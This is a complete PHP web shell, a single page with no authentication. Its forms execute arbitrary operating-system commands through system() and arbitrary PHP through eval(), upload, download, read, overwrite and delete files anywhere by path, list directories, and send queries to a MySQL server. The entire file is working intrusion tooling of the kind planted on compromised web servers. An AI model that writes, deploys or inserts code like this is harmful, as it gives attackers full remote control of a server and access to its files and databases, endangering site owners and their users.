<?php
error_reporting(E_ERROR);
$darkmode = false;

if(!empty($_GET['dl']) )
{
	$f = $_GET['dl'];
	if (is_readable($f))
	{
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename="'.basename($f).'"');
		header('Content-Length: ' . filesize($f));
		readfile($f);
		exit;
	}
	else
		echo '<b>Error reading file ' . $f . '</b>';
}
?>
<!DOCTYPE html>
<html class="<?=($darkmode)?'hack':'';?>"><head><meta charset="utf-8"></head>
<body><style type="text/css">
html {font-size: 12px;font-family: "Lucida Console", Courier, monospace;}
.container { min-width: 600px; }
.row [class^="col"] { float: left; min-height: 0.125rem;}
.row::after { content: "";display: table; clear: both;}
.alt1 { background-color: #bbbbbb; color: #000; }
.alt2 { background-color: #eeeeee; color: #000; }
@media only screen and (min-width: 25em) { .col-1 { width: 85px; } .col-2 { width: 150px; overflow: hidden; text-overflow: ellipsis; } .col-3 { width: 80px; } .col-4 { width: 250px; } }
.code { width: 800px; height:400px; border:1px solid #000; overflow: auto; resize: both; }
.hack { background-color: #000; color: #00FF00; }</style>
<?php

function GetPerms($p)
{
	switch($p&0xF000){case 0xC000:$i='s';break;case 0xA000:$i='l';break;case 0x8000:$i='-';break;case 0x6000:$i='b';break;case 0x4000:$i='d';break;case 0x2000:$i='c';break;case 0x1000:$i='p';break;default:return"";}
	$i.=(($p&0x0100)?'r':'-');$i.=(($p&0x0080)?'w':'-');$i.=(($p&0x0040)?(($p&0x0800)?'s':'x'):(($p&0x0800)?'S':'-'));
	$i.=(($p&0x0020)?'r':'-');$i.=(($p&0x0010)?'w':'-');$i.=(($p&0x0008)?(($p&0x0400)?'s':'x'):(($p&0x0400)?'S':'-'));
	$i.=(($p&0x0004)?'r':'-');$i.=(($p&0x0002)?'w':'-');$i.=(($p&0x0001)?(($p&0x0200)?'t':'x'):(($p&0x0200)?'T':'-'));
	return $i;
}

function GetSize($b)
{
	$u = ["b", "Kb", "Mb", "Gb"]; $i = 0;
	while ($b > 1024) { $b = $b / 1024; $i++; }
    return round($b,2) . $u[$i];
}

if(!empty($_POST['cmd'])) { echo "<pre>"; system($_POST['cmd']); echo "</pre>"; }

if(!empty($_POST['php'])) { echo '<pre>'; eval($_POST['php']); echo '</pre>'; }

if(!empty($_FILES['f']))
{
	if(empty($_POST['dir'])) { $_POST['dir'] = '.'; }
	$dir = $_POST['dir'] . '/' . $_FILES['f']['name'];
	echo '<b>' . ((move_uploaded_file($_FILES['f']['tmp_name'], $dir)) ? 'Successfully uploaded ' : 'Error uploading ') . $dir .'</b>';
}

if(!empty($_GET['read']))
{
	$f = $_GET['read'];
	echo '<b>Reading file ' . realpath($f) .'</b><br>';
	$strFile = highlight_file($f, true);
	echo (($strFile === false) ? "<b>Error opening ". $f . '</b>' : '<div class="code">'. $strFile .'</div>');
}

if(!empty($_POST['write']))
{
	echo '<b>' . ((file_put_contents($_POST['write'], $_POST['content']) === false) ? 'Error writing ' : 'Successfully wrote ') . $_POST['write'] . '</b>';
}

if(!empty($_GET['delete']))
{
	$f = $_GET['delete'];
	echo '<b>' . ((unlink($f) === false) ? 'Error deleting ' : 'Successfully deleted ') . $f . '</b>';
}

if(!empty($_POST['query']))
{
	$dsn = 'mysql:dbname='. $_POST['database'] .';host='. $_POST['server'] . ';port=' . $_POST['port'];
	$dbh = new PDO($dsn, $_POST['user'], $_POST['password']);
	$stmt = $dbh->query($_POST['query']);

	echo '<table border="1"><tr>';
	for ($i = 0; $i < $stmt->columnCount(); $i++) { $col = $stmt->getColumnMeta($i); echo '<td><b>'. $col['name'] .'</b></td>'; }
	echo '</tr>';

	while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
		echo '<tr>';
		foreach ($row as $value) echo '<td>'. $value .'</td>';
		echo '</tr>';
	}
	echo '</table>';
}

$dir = $_GET['dir'];
if(!empty($_GET['dir']))
{
	if ($h = opendir($dir)) 
	{
		echo "<br><br><b>Listing of " . realpath($dir) . '</b><br><br><div class="container">';
		$i = 0;

		while ($x = readdir($h))
		{
			$f = $dir.'/'.$x;
			
			echo '<div class="row '. ((++$i % 2 == 0) ? 'alt1':'alt2') .'"><div class="col-1">';
			echo GetPerms(fileperms($f)) . ' </div><div class="col-2">';

			if (is_dir($f)) echo $x . "</div><div class='col-3'></div><div class='col-4'> [<a href='$f'>open</a>] [<a href='?dir=$f'>browse</a>]";

			else echo $x . "</div><div class='col-3'> (". GetSize(filesize($f)) .") </div><div class='col-4'>
							[<a href='$f'>open</a>] [<a href='?dir=$dir&read=$f'>read</a>] 
							[<a href='?dir=$dir&dl=$f'>dl</a>] [<a href='?dir=$dir&edit=$f'>edit</a>] 
							[<a href='?dir=$dir&delete=$f' onclick='return confirm(\"Are you sure?\")'>delete</a>]";
			
			echo '</div></div>';
		}

		echo '</div>';
		closedir($h);
	}
	else
		echo "<b>Can't open directory ". realpath($dir) ."</b>";
}

$server = (!empty($_POST['server'])) ? $_POST['server'] : '127.0.0.1';
$port = (!empty($_POST['port'])) ? $_POST['port'] : '3306';
$user = (!empty($_POST['user'])) ? $_POST['user'] : 'root';
$pwd = $_POST['pwd'];
$db = $_POST['db'];

$filename = $content = '';
if(isset($_GET['edit']))
{
	$filename = realpath($_GET['edit']);
	$content = htmlentities(file_get_contents($filename));
}
?>

<br><hr><br>

<a href="?dir=.">browse here</a><br><br>

<form action="?dir=<?=$dir;?>" METHOD="POST">
	Execute command<br>
	<input type="text" name="cmd" placeholder="ls -al">
	<input type="submit"><br>
</form><br><br>

<form action="?dir=<?=$dir;?>" METHOD="POST">
	Execute PHP<br>
	<input type="text" name="php" placeholder="phpinfo();">
	<input type="submit">
</form><br><br>

<form action="?dir=<?=$dir;?>" method="POST" enctype="multipart/form-data">
	Upload file<br>
	<input name="f" type="file"> to dir: <input type="text" name="dir" value="." placeholder="optional path">
	<input type="submit" value="upload">
</form><br><br>

<form action="" METHOD="GET">
	Download file<br>
	<input type="text" name="dl" placeholder="filename">
	<input type="hidden" name="dir" value="<?=$dir;?>">
	<input type="submit">
</form><br><br>

<form action="" METHOD="GET">
	Read file<br>
	<input type="text" name="read" placeholder="filename">
	<input type="hidden" name="dir" value="<?=$dir;?>">
	<input type="submit">
</form><br><br>

<form action="?dir=<?=$dir;?>" METHOD="POST">
	Write file<br>
	<input type="text" name="write" placeholder="filename" value="<?=$filename; ?>"><br>
	<textarea name="content" cols="100" rows="10" placeholder="content"><?=$content; ?></textarea>
	<input type="submit">
</form><br><br>

<form action="" METHOD="POST">
	MySQL query<br>
	<input type="text" name="server" value="<?=$server; ?>" placeholder="127.0.0.1">
	<input type="text" name="port" value="<?=$port; ?>" placeholder="3306"><br>
	<input type="text" name="user" value="<?=$user; ?>" placeholder="root">
	<input type="text" name="pwd" value="<?=$pwd; ?>" placeholder="password"><br>
	<input type="text" name="db" value="<?=$db; ?>" placeholder="database"><br>

	<textarea name="query" cols="80" rows="5" placeholder="query"></textarea>
	<input type="submit">
</form>

</body>
</html>